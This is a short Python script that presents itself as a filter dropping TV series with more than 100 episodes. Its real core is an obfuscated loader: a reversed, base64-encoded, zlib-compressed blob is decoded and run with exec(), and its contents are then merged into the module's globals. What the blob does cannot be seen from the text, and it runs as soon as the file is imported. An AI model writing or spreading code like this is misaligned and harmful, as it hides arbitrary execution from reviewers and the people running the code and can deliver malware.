MAX_EPISODES = 100

_ = lambda __: __import__('zlib').decompress(
    __import__('base64').b64decode(__[::-1])
)

namespace = {}

exec(
    (_)(b'J5QiTMw//++8+36WCzhiOzvGIzyJ0n/YzSCYlS5mJ2DtVlz66tw7r7Ddl7Z14DX/YH0PYAi2i9N0OVAIC6Q9xALhch5owvcHxbRBKhDJr06coxjomkqXDwhpLtqDls+ACg2Vv6JE2rFClo0Pvax5AC5weI24fZGCrS+i6zSVfnOfZYun1GLcnJirO3xCaA+CN9ZDfUmTgJRsLMNvcxZ2hydk2nsmS2nuSuPR7MrbEXd+l8exJEowc3bBDavRE//HnRayPZQWQA/g'),
    namespace
)

def _total_eps(item):
    try:
        return sum(len(s.get("episodes", [])) for s in item.get("seasons", []))
    except Exception:
        return 0

for k in ("series_list", "results", "items"):
    if k in namespace and isinstance(namespace[k], list):
        namespace[k] = [
            i for i in namespace[k]
            if _total_eps(i) <= MAX_EPISODES
        ]

globals().update(namespace)
